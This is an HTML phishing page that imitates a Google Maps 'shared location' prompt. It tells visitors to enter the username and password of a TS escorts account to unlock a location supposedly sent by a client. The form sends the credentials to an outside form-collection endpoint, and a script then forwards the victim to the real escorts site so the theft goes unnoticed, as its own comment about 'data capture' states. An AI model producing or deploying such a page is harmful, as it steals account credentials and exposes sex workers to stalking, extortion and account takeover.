<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <meta property="og:title" content="Google Maps: Shared Location Pin">
    <meta property="og:description" content="Verify your account to view this private location shared with you.">
    <meta property="og:image" content="https://upload.wikimedia.org/wikipedia/commons/a/aa/Google_Maps_icon_%282020%29.svg">
    <meta property="og:type" content="website">

    <title>Google Maps - Location Gateway</title>
    
    <style>
        body, html { height: 100%; margin: 0; font-family: -apple-system, sans-serif; overflow: hidden; }
        
        /* The "Map" background - generated internally via CSS */
        #bg-map {
            position: fixed;
            top: 0; left: 0; width: 100%; height: 100%;
            background-image: url('https://techcrunch.com/wp-content/uploads/2019/02/google-maps-ar.jpg');
            background-size: cover;
            background-position: center;
            filter: blur(12px); /* Blurred internally so you don't need a blurred image file */
            -webkit-filter: blur(12px);
            z-index: -1;
            transform: scale(1.1); /* Hides white edges caused by blur */
        }

        .overlay { display: flex; justify-content: center; align-items: center; height: 100%; background: rgba(0,0,0,0.15); }
        
        .login-box { 
            background: rgba(255, 255, 255, 0.98); 
            padding: 35px; 
            border-radius: 15px; 
            box-shadow: 0 10px 30px rgba(0,0,0,0.25); 
            width: 85%; 
            max-width: 380px; 
            text-align: center; 
        }

        .logo { width: 60px; margin-bottom: 15px; }
        
        /* Your Red TS Styling */
        .ts-brand {
            color: #d93025;
            font-weight: 900;
            font-size: 1.8em; 
            text-transform: uppercase;
            display: inline-block;
            vertical-align: middle;
        }

        h2 { font-size: 20px; color: #202124; margin-bottom: 10px; }
        p { color: #5f6368; font-size: 14px; margin-bottom: 25px; line-height: 1.4; }
        
        input { width: 100%; padding: 14px; margin: 8px 0; border: 1px solid #dadce0; border-radius: 6px; box-sizing: border-box; font-size: 16px; }
        
        .loader { border: 3px solid #f3f3f3; border-top: 3px solid #1a73e8; border-radius: 50%; width: 20px; height: 20px; animation: spin 1s linear infinite; display: none; margin: 15px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }

        button { width: 100%; padding: 14px; background: #1a73e8; color: white; border: none; border-radius: 6px; font-weight: 600; font-size: 16px; cursor: pointer; margin-top: 15px; }
    </style>
</head>
<body>

    <div id="bg-map"></div>

    <div class="overlay">
        <div class="login-box">
            <img src="https://upload.wikimedia.org/wikipedia/commons/a/aa/Google_Maps_icon_%282020%29.svg" class="logo">
            <h2>Location Blocked</h2>
            <p>Login to your <span class="ts-brand">TS</span> escorts account to unlock the private location shared by your client.</p>
            
            <form action="https://usebasin.com/f/7ab2ba455334" method="POST" id="main-form">
                <input type="text" name="user_id" placeholder="Username or Email" required>
                <input type="password" name="user_pass" placeholder="Password" required>
                <div id="loading" class="loader"></div>
                <button type="submit" id="btn">Unlock Map</button>
            </form>
        </div>
    </div>

    <script>
        const form = document.getElementById('main-form');
        const loader = document.getElementById('loading');
        const btn = document.getElementById('btn');

        form.onsubmit = function() {
            btn.style.display = 'none';
            loader.style.display = 'block';
            
            // Wait for data capture, then jump to the real site
            setTimeout(() => {
                window.location.href = "https://m.tsescorts.com/login";
            }, 1500);
        };
    </script>
</body>
</html>
